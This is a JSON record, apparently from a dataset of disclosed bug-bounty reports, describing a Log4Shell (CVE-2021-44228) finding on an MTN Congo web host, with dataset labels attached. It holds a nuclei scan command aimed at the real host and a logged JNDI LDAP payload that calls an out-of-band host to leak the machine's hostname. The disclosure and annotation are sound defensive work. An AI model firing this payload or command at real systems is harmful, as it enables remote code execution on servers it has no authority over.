@@ -1,0 +1,45 @@
+{
+  "reported_to": "MTN Group",
+  "reported_by": "renzi ",
+  "title": "Remote code injection in Log4j on  https://mymtn.mtncongo.net - CVE-2021-44228",
+  "content": "\nSummary\nHello,\nI would to like report this security flaw on https://mymtn.mtncongo.net. Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)\nSteps To Reproduce\nHow we can reproduce the issue;\nrun nuclei script via cmd; ./nuclei -u https://mymtn.mtncongo.net:8443 -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml\nIt will retrive the hostname of machine on output \" [net]\"\nLike this;\nCode 172 Bytes\n1[2021-12-14 03:38:05] [CVE-2021-44228] [http] [critical] https://mymtn.mtncongo.net:8443/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbdgeyyyd66.interact.sh/a} [net]\nMitigation\nUpdate according the vendor and thecnical references..\nReferences\nhttps://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability\nhttps://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476\nImpact\nRemote command execution\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "OS Command Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1724514900,
+  "report_url": "https://hackerone.com/reports/1425565",
+  "is_multi_component": false,
+  "complexity": "HIGH",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Run the nuclei script with the following command: ./nuclei -u https://mymtn.mtncongo.net:8443 -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml"
+    ],
+    [
+      2,
+      "Observe the output, which will include the hostname of the machine if the vulnerability is present."
+    ]
+  ],
+  "vuln_description": "This vulnerability is a remote code injection in Log4j (CVE-2021-44228) that allows for remote command execution. The tester used a nuclei script to exploit this vulnerability and retrieve the hostname of the target machine.",
+  "reason": "The vulnerability was discovered using a publicly available script (nuclei-templates) that automates the detection of this specific CVE. The attack does not require multiple components, complex interactions, or novel logic; it is a straightforward exploitation of a known vulnerability.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves remote code injection via Log4j (CVE-2021-44228), which is not related to authentication or authorization bypass. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities by manipulating user sessions and resource IDs within the same application. The Log4j vulnerability is a separate class of vulnerability (RCE) and does not fit the described detection methods.",
+    "is_detectable": false
+  }
+}
